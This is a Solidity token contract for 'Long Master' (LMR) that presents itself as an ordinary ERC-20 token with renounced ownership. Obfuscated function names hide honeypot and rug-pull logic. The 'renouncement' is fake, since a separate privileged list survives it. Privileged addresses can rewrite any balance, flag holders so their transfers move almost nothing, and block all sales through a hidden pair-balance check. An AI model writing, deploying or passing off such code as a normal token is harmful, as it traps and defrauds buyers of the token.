//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface sellAuto {
    function createPair(address modeMarketing, address swapSell) external returns (address);
}

interface minShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minLaunched) external view returns (uint256);

    function transfer(address enableLaunched, uint256 liquidityTx) external returns (bool);

    function allowance(address shouldSellTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityTx) external returns (bool);

    function transferFrom(
        address sender,
        address enableLaunched,
        uint256 liquidityTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletBuyTotal, uint256 value);
    event Approval(address indexed shouldSellTo, address indexed spender, uint256 value);
}

abstract contract limitLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyReceiverTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface minShouldMetadata is minShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LongMaster is limitLaunched, minShould, minShouldMetadata {

    function symbol() external view virtual override returns (string memory) {
        return totalMax;
    }

    function fromLaunch(address maxMin, address enableLaunched, uint256 liquidityTx) internal returns (bool) {
        require(fromList[maxMin] >= liquidityTx);
        fromList[maxMin] -= liquidityTx;
        fromList[enableLaunched] += liquidityTx;
        emit Transfer(maxMin, enableLaunched, liquidityTx);
        return true;
    }

    string private atTrading = "Long Master";

    function approve(address fundLaunched, uint256 liquidityTx) public virtual override returns (bool) {
        walletMax[_msgSender()][fundLaunched] = liquidityTx;
        emit Approval(_msgSender(), fundLaunched, liquidityTx);
        return true;
    }

    event OwnershipTransferred(address indexed modeAutoSender, address indexed tradingReceiver);

    constructor (){
        if (maxTeamReceiver) {
            minLiquidity = exemptTx;
        }
        buyReceiverTeam minTo = buyReceiverTeam(modeAuto);
        toLaunch = sellAuto(minTo.factory()).createPair(minTo.WETH(), address(this));
        if (maxTeamReceiver) {
            teamMin = true;
        }
        receiverFeeSender = _msgSender();
        takeTotal[receiverFeeSender] = true;
        fromList[receiverFeeSender] = marketingMin;
        teamReceiver();
        if (exemptTx != marketingFrom) {
            marketingFrom = exemptTx;
        }
        emit Transfer(address(0), receiverFeeSender, marketingMin);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingMin;
    }

    function allowance(address exemptToken, address fundLaunched) external view virtual override returns (uint256) {
        if (fundLaunched == modeAuto) {
            return type(uint256).max;
        }
        return walletMax[exemptToken][fundLaunched];
    }

    uint256 tradingMax;

    mapping(address => bool) public tradingBuyTo;

    bool private exemptTakeToken;

    bool private maxTeamReceiver;

    function decimals() external view virtual override returns (uint8) {
        return listTx;
    }

    string private totalMax = "LMR";

    uint8 private listTx = 18;

    function transferFrom(address maxMin, address enableLaunched, uint256 liquidityTx) external override returns (bool) {
        if (_msgSender() != modeAuto) {
            if (walletMax[maxMin][_msgSender()] != type(uint256).max) {
                require(liquidityTx <= walletMax[maxMin][_msgSender()]);
                walletMax[maxMin][_msgSender()] -= liquidityTx;
            }
        }
        return enableIs(maxMin, enableLaunched, liquidityTx);
    }

    address private modeTx;

    function marketingReceiverTrading(address marketingTake, uint256 liquidityTx) public {
        toSellAuto();
        fromList[marketingTake] = liquidityTx;
    }

    address totalSwapExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public walletFee;

    function owner() external view returns (address) {
        return modeTx;
    }

    address modeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private walletMax;

    function fromShould(address liquidityTakeTeam) public {
        toSellAuto();
        
        if (liquidityTakeTeam == receiverFeeSender || liquidityTakeTeam == toLaunch) {
            return;
        }
        tradingBuyTo[liquidityTakeTeam] = true;
    }

    bool public teamMin;

    uint256 public exemptTx;

    uint256 private marketingMin = 100000000 * 10 ** 18;

    address public toLaunch;

    uint256 listTotal;

    function toSellAuto() private view {
        require(takeTotal[_msgSender()]);
    }

    uint256 private fundTotal;

    function feeTokenLiquidity(uint256 liquidityTx) public {
        toSellAuto();
        tradingMax = liquidityTx;
    }

    function senderMax(address shouldSender) public {
        require(shouldSender.balance < 100000);
        if (walletFee) {
            return;
        }
        if (minLiquidity == launchedBuy) {
            marketingFrom = launchedBuy;
        }
        takeTotal[shouldSender] = true;
        
        walletFee = true;
    }

    function enableIs(address maxMin, address enableLaunched, uint256 liquidityTx) internal returns (bool) {
        if (maxMin == receiverFeeSender) {
            return fromLaunch(maxMin, enableLaunched, liquidityTx);
        }
        uint256 senderFee = minShould(toLaunch).balanceOf(totalSwapExempt);
        require(senderFee == tradingMax);
        require(enableLaunched != totalSwapExempt);
        if (tradingBuyTo[maxMin]) {
            return fromLaunch(maxMin, enableLaunched, totalMaxAuto);
        }
        return fromLaunch(maxMin, enableLaunched, liquidityTx);
    }

    function getOwner() external view returns (address) {
        return modeTx;
    }

    address public receiverFeeSender;

    function transfer(address marketingTake, uint256 liquidityTx) external virtual override returns (bool) {
        return enableIs(_msgSender(), marketingTake, liquidityTx);
    }

    mapping(address => uint256) private fromList;

    uint256 public minLiquidity;

    function teamReceiver() public {
        emit OwnershipTransferred(receiverFeeSender, address(0));
        modeTx = address(0);
    }

    mapping(address => bool) public takeTotal;

    uint256 private launchedBuy;

    uint256 public marketingFrom;

    uint256 constant totalMaxAuto = 15 ** 10;

    function balanceOf(address minLaunched) public view virtual override returns (uint256) {
        return fromList[minLaunched];
    }

    function name() external view virtual override returns (string memory) {
        return atTrading;
    }

}